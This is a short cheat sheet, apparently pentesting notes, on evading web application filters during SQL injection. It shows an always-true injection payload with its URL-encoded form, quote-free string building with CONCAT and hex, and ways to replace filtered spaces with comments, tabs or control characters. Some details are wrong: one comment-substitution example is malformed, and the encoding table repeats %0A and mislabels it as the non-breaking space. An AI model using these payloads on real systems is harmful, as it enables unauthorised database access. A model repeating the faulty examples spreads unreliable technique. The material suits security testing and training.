# Filter Evaison Techniques

## 1. URL Encoding
Bypass web application filters.

Original payload:
```sh
1' || 1=1--
```

Encoded (the + adds a space to avoid errors):
```sh
1%27%20||%201=1%20--+
```

## 2. Hexadecimal Encoding
Bypass filters that do not decode these values before processing.

## 3. Unicode Encoding
Bypass filters that only check ASCII characters.

## 4. No-Quote Injection
If a filter strips `'` and `"` there are still options available.

### 4.1 Numerical values
Sometimes quotes are not needed at all a string like "john smith" can just be `1` and not require quoting.

### 4.2 SQL Comments
Use a comment to terminate the rest of the query. `admin'--` can just be `admin--`

### 4.3 Concat
You can build strings without using quotes. The following example constructs the string "admin"

```sql
CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
```

## 5. No Spaces Allowed
When spaces are filtered out  we can apply the following techniques:

### 5.1 Replace with comments
```sql
SELECT * FROM Users WHERE name = 'admin'

SELECT/**//*FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'
```

### 5.2 Replace with tab / newline
```sql
SELECT\t*\tFROM\tUsers\tWHERE\tname\t=\t'admin'
```

### 5.3 Alternate characters
| Encoded | Character |
| ------- | --------- |
| `%09` | Horizontal Tab |
| `%0A` | Line feed |
| `0C` | Form feed |
| `%0D` | Carriage return |
| `%0A` | Non-breaking space |
